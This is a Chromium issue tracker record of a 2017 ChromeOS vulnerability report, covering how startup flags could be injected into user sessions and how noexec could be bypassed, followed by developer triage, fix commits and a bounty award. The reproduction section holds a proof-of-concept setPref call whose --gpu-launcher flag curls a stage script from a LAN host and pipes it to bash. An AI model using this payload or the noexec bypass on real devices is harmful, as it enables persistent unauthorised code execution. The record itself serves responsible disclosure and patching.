# Security: Persistent pre and post login command execution as chronos user, with noexec bypass allowing any binary

| Field | Value |
|-------|-------|
| **Issue ID** | [40087232](https://issues.chromium.org/issues/40087232) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Enterprise, UI>Settings |
| **Platforms** | ChromeOS |
| **Reporter** | ro...@rorym.cnamara.com |
| **Assignee** | em...@chromium.org |
| **Created** | 2017-04-01 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**  

The device owner can bypass --policy-switches-end and persistently configure user session flags for all users, allowing for command execution pre- and  

post- user login for any user. A noexec bypass allows the execution of any binary as a payload.

**VERSION**  

Version 57.0.2987.137 (64-bit)  

Platform 9202.60.0 (Official Build) stable-channel swanky  

Firmware Google\_Swanky.5216.238.5  

Toshiba Chromebook 2

**REPRODUCTION CASE**  

By using the chrome.settingsPrivate.setPref API on the chrome://settings page, the device owner can set the cros.startup\_flags preference to an array of flags  

which are persistently applied to the initial chrome process on boot. If the first flag is --policy-switches-end these flags are also applied to user sessions.

This preference cannot be set by any other user.

WARNING: if the networking is not already setup, or the device cannot retrieve the stage scripts, the gpu-process may not start. If networking cannot be restored  

it is necessary to powerwash to regain access (to do so without GUI access I used Esc+Refresh+Power to initiate dev mode, and then immediately re-enable rootfs  

verification before devmode is fully enabled). This is due to the network staged PoC, rather than the exploit itself.

A proof of concept is as follows:

chrome.settingsPrivate.setPref('cros.startup\_flags', ['--policy-switches-end', '--crosh-command=/bin/bash', '--system-developer-mode', '--gpu-launcher=/bin/bash -c $(curl${IFS}-s${IFS}http://172.16.4.33:8000/stage1.sh|bash${IFS}-s)', '--policy-switches-begin'], 'exploit', console.log)

Execute this function using the devtools on the chrome://settings page, or any other page with the appropriate API permissions, and reboot the device.

The main command execution uses the --gpu-launcher command, --crosh-command and --system-developer-mode are added for ease of exploitation (Ctrl+Shift+T will  

drop the user directly into bash, rather than crosh)

--gpu-launcher could be replaced by --renderer-cmd-prefix or --utility-cmd-prefix, gpu-launcher was chosen as it was relatively forgiving when it came to  

creating a proof of concept.

The above command retrieves and executes stage1.sh, which forks, retrieves and executes stage2, and executes the real gpu process. This executes immediately  

on boot. stage2.sh uses a noexec bypass with minijail0 to execute a binary payload once any user (including guest) has logged in (by waiting for the  

/home/chronos/user/Downloads directory to appear). For my proof of concept I used the Metasploit mettle Linux binary, but this is not wholly relevant to the  

exploit, just the proof of concept. Any alternate binary could be executed.

The noexec bypass uses user mount namespaces with pid mapping to mount a tmpfs directory, which does not have the noexec flag applied, and this mount is then  

accessed via the /proc/${PID}/cwd directory from outside the namespace, allowing a temporary executable mount. This mount also does not have the nosuid flag  

applied, but it can only be read/written by the chronos user (or root), so this is not useful without another exploit (e.g root command execution to drop a  

setuid shell)

Whilst the proof of concepts in this situation require at least LAN access, this is for ease of exploitation, and the payload could be obtained through another  

method, or provided inline.

The attached screenshot shows the flags in use in chrome://version, and the use of the exec namespace to execute busybox. The namespace setup is in setup2.sh

## Attachments

- [stage1.sh](attachments/stage1.sh) (text/plain, 164 B)
- [stage2.sh](attachments/stage2.sh) (text/plain, 776 B)
- [Screenshot 2017-04-02 at 12.11.20 AM.png](attachments/Screenshot 2017-04-02 at 12.11.20 AM.png) (image/png, 193.3 KB)

## Timeline

### do...@chromium.org (2017-04-03)

+cc settings folks.

This doesn't seem like much of a security risk since it requires physical access to an unlocked machine (so you can execute the script on the settings page). There are a number of private APIs which are whitelisted for certain pages, and naturally opening devtools on them allows you to access those APIs too. See https://www.chromium.org/Home/chromium-security/security-faq#TOC-Why-aren-t-physically-local-attacks-in-Chrome-s-threat-model-

dbeam/stevenjb, what is your opinion here?

[Monorail components: UI>Settings]

### ro...@rorym.cnamara.com (2017-04-03)

After a little more research I believe this could be a slightly more general purpose persistence method. The code beneath the setPref call uses the org.chromium.SessionManagerInterface.StorePolicy dbus API.

This endpoint takes a serialized protobuf devicepolicy, signed with (I believe) /var/lib/whitelist/owner.key. This file is stored as:

chronos@localhost / $ ls -l /var/lib/whitelist/owner.key
-rw----r-- 1 root root 294 Apr  3 15:04 /var/lib/whitelist/owner.key

Which does not appear to change when logged in as guest, and is therefore readable by any user. (Alternatively, file read bugs such as crbug.com/702030
or crbug.com/678365 (fixed) could have been used to read the owner key)

With this in mind I think it is possible that any user with command execution (or other ability to issue arbitrary dbus calls) can invoke the dbus
endpoint to store a policy in the same way as setPref does, installing persistence from non-owner accounts.

### av...@chromium.org (2017-04-03)

This is a ChromeOS issue.

### st...@chromium.org (2017-04-03)

The chrome.settingsPrivate API is supposed to use a whitelist to filter allowed settings. (And cros.startup_flags is most certainly not in that whitelist).

If the whitelist is not working then that is a serious bug.

I will investigate further today when I am back at my desk.


### st...@chromium.org (2017-04-03)

It turns out we only use the whitelist for determining the list of prefs that we provide. I will discuss with the team using it as a general filter as well.


### st...@chromium.org (2017-04-03)

[Empty comment from Monorail migration]

### ta...@google.com (2017-04-03)

[Empty comment from Monorail migration]

### st...@chromium.org (2017-04-04)

CL to properly whitelist settings in the extension API is here: https://codereview.chromium.org/2792163003/

+ygorshenin@, +dcheng@ - This setting gets used here:
https://cs.chromium.org/chromium/src/chrome/browser/chromeos/settings/device_settings_provider.cc?q=device_settings_provider.cc+package:%5Echromium$&l=271

Should we be doing any extra checks on those strings also?


### bu...@chromium.org (2017-04-04)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/5679d251c7f59517f9423c1ee6e3c1825b116ead

commit 5679d251c7f59517f9423c1ee6e3c1825b116ead
Author: stevenjb <stevenjb@chromium.org>
Date: Tue Apr 04 20:44:30 2017

chrome.settingsPrivate: Check whitelist for getPref / setPref

We shouldn't provide access to prefs that are not in the Settings
whitelist for getPref or setPref.

BUG=707539
For comment change to settings_private.idl:
TBR=rdevlin.cronin@chromium.org

Review-Url: https://codereview.chromium.org/2792163003
Cr-Commit-Position: refs/heads/master@{#461824}

[modify] https://crrev.com/5679d251c7f59517f9423c1ee6e3c1825b116ead/chrome/browser/extensions/api/settings_private/prefs_util.cc
[modify] https://crrev.com/5679d251c7f59517f9423c1ee6e3c1825b116ead/chrome/browser/extensions/api/settings_private/prefs_util.h
[modify] https://crrev.com/5679d251c7f59517f9423c1ee6e3c1825b116ead/chrome/common/extensions/api/settings_private.idl


### ro...@rorym.cnamara.com (2017-04-04)

Whilst the lack of effective whitelisting is the main entrypoint to this exploit, I also believe that the ability to propagate flags into user sessions is also a security vulnerability. Based on the comments in [1], it appears that the flags between --policy-switches-start and --policy-switches-end should not be applied to user sessions, so the ability to escape is not desirable.

I am not sure if it's possible to use this directly with StorePolicy but based on the proto file [1] I don't see why not.

Apologies if this is already being fixed or I am incorrect regarding the impact of this.


[1] https://chromium.googlesource.com/chromium/src/chrome/browser/chromeos/policy/proto/+/master/chrome_device_policy.proto#399

### st...@chromium.org (2017-04-04)

With https://codereview.chromium.org/2792163003, that should at least prevent using chrome.settingsPrivate to set cros.startup_flags. This has been in the code for a while, so backporting doesn't make a whole lot of sense, but it would be easy enough to port if desired.

I leave any other shoring up to others who know more about how cros.startup_flags is used.


### ro...@rorym.cnamara.com (2017-09-21)

Hi, there hasn't been any movement on this issue for a few months, I was wondering if it is going to be fixed/closed?

### de...@chromium.org (2017-09-21)

Cc-ing a few more people who may know more about the expectations here.

### at...@chromium.org (2017-09-25)

mnissler/bartfab: Do you know the history here? The code *looks* like policy-switches-start/end is for kiosk sessions only, but maybe there's a bug or something I'm missing.

### jo...@chromium.org (2017-09-27)

It does seems that these flags should not be propagated to user sessions. Assigning to Bartosz for confirmation.

### at...@chromium.org (2017-09-28)

+emaxx who may have some context for how these would end up getting passed to user sessions

### ba...@chromium.org (2017-10-12)

[Empty comment from Monorail migration]

### ba...@chromium.org (2017-10-12)

The policy for command-line flags and the sentinel flags were added by Julian. He would know best how this is supposed to work (if he still remembers):

https://chromium.googlesource.com/chromiumos/platform/login_manager/+/9125966ce4eb0f0a476bf7b059474ab88394e82c%5E%21/#F0

### pa...@chromium.org (2017-10-13)

If there is no way for the owner after the fix applied above or any other user to set the cros pref I think we are safe as this policy is not exposed for admins through CPanel either and has only been used for internal or trusted testing.

I am not opposed to writing further sensitization about what flags are allowed in it though but I don't think  have the cycles to try to intervene myself.

@Mattias: WDYT?



### pa...@chromium.org (2017-12-21)

I have contributed as much as I could to this discussion. I will unassign myself from the bug and put it back in the triage pool for it to be acted upon by someone on the ChromeOS team if they feel like there is anything more to do here.

[Monorail components: Enterprise]

### em...@chromium.org (2017-12-21)

The command-line flags from that setting leak into the user session due to an imperfection in the browser's logic that determines whether it needs to be restarted after sign-in.
The code in [1] simply looks at flags between the first occurrences of "--policy-switches-begin" and "--policy-switches-end". Therefore, when the command line has a form of
  "... --policy-switches-begin --policy-switches-end --foo --bar --policy-switches-end ...",
the browser decides that there are no extra flags and it's safe to continue with the current (sign-in-screen) command line (see [2] for the decider).

A way to fix this issue could be to add sanitizing into the piece that makes up command line from the StartUpFlagsProto contents. This code could check whether the supplied strings contain the problematic "--policy-switches-end" and deleting it (optionally, with checking for other suspicious sentinels like "--flag-switches-begin"). This lives in session_manager (see [3]).

I'll create a CL and we'll see what the corresponding OWNERS think of this approach.

[1] https://cs.chromium.org/chromium/src/components/flags_ui/flags_state.cc?l=70&rcl=dea436ad50902845d570c50c3d79644ccd5ed846
[2] https://cs.chromium.org/chromium/src/chrome/browser/chromeos/login/session/user_session_manager.cc?l=290&rcl=dea436ad50902845d570c50c3d79644ccd5ed846
[3] https://chromium.googlesource.com/chromiumos/platform/login_manager/+/85771afad4980ae18f1383e78b428cdc41650bc6/device_policy_service.cc#241

### bu...@chromium.org (2017-12-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromiumos/platform2/+/ecb996771d0373907d4ac50ee803f4aed4f3cbd2

commit ecb996771d0373907d4ac50ee803f4aed4f3cbd2
Author: Maksim Ivanov <emaxx@google.com>
Date: Sat Dec 23 04:20:58 2017

login: Sanitize sentinel flags in Chrome startup flags

Make sure that policy sentinel flags (--policy-switches-begin,
--policy-switches-end) can't be injected in the middle of the
Chrome startup flags.

Without this, Chrome's command line parsing logic may be fooled
into not seeing the additional flags when deciding whether the
restart is required.

BUG=chromium:707539
TEST=new unit test,
     manual test: set DeviceStartUpFlags policy to
     "--policy-switches-end --any-chrome-flag" and check that
     browser is restarted during user sign-in

Change-Id: I0344613a9308323746007e9137f5e3e323923d4f

[modify] https://crrev.com/ecb996771d0373907d4ac50ee803f4aed4f3cbd2/login_manager/device_policy_service.cc
[modify] https://crrev.com/ecb996771d0373907d4ac50ee803f4aed4f3cbd2/login_manager/device_policy_service_unittest.cc


### bu...@chromium.org (2018-01-18)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/6fba75b7c5a1d0865d3ce14344f87799c67b2e55

commit 6fba75b7c5a1d0865d3ce14344f87799c67b2e55
Author: Maksim Ivanov <emaxx@chromium.org>
Date: Thu Jan 18 23:46:05 2018

Bulletproof flag sentinels parsing against duplicate ending sentinels

When extracting flags from command line, use the last occurrence of the
end sentinel instead of the first one. This bulletproofs against
potential injection of extra sentinel switches (although these should be
sanitized by session_manager now), which could fool Chrome into not
restarting when it's necessary due to extra flags.

Also avoid crash/UB in case the sentinels come in reversed order.

BUG=707539
TEST=new unit tests

Change-Id: I5c20b1990e0b71e07076ec89285fccd52f1dc190
Reviewed-on: https://chromium-review.googlesource.com/844776
Commit-Queue: Maksim Ivanov <emaxx@chromium.org>
Reviewed-by: Alexei Svitkine <asvitkine@chromium.org>
Cr-Commit-Position: refs/heads/master@{#530345}
[modify] https://crrev.com/6fba75b7c5a1d0865d3ce14344f87799c67b2e55/components/flags_ui/flags_state.cc
[modify] https://crrev.com/6fba75b7c5a1d0865d3ce14344f87799c67b2e55/components/flags_ui/flags_state_unittest.cc


### em...@chromium.org (2018-01-19)

[Empty comment from Monorail migration]

### ro...@rorym.cnamara.com (2018-01-24)

Now that this issue has been fixed, does it qualify for the vulnerability rewards program?

### jo...@chromium.org (2018-01-24)

Let's send it to the panel.

### at...@chromium.org (2018-02-06)

[Empty comment from Monorail migration]

### at...@chromium.org (2018-02-06)

[Empty comment from Monorail migration]

### po...@chromium.org (2018-02-07)

[Empty comment from Monorail migration]

### va...@chromium.org (2018-02-08)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-02-08)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-02-09)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-02-09)

Superb! The VRP panel decided to award $5,000 for this report :-D

### aw...@google.com (2018-02-09)

[Empty comment from Monorail migration]

### ro...@rorym.cnamara.com (2018-02-09)

Thanks!

### sh...@chromium.org (2018-04-27)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### va...@chromium.org (2018-05-10)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-28)

[Empty comment from Monorail migration]

### is...@google.com (2018-07-28)

This issue was migrated from crbug.com/chromium/707539?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Enterprise, UI>Settings]
[Monorail blocked-on: crbug.com/chromium/810235]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40087232)*
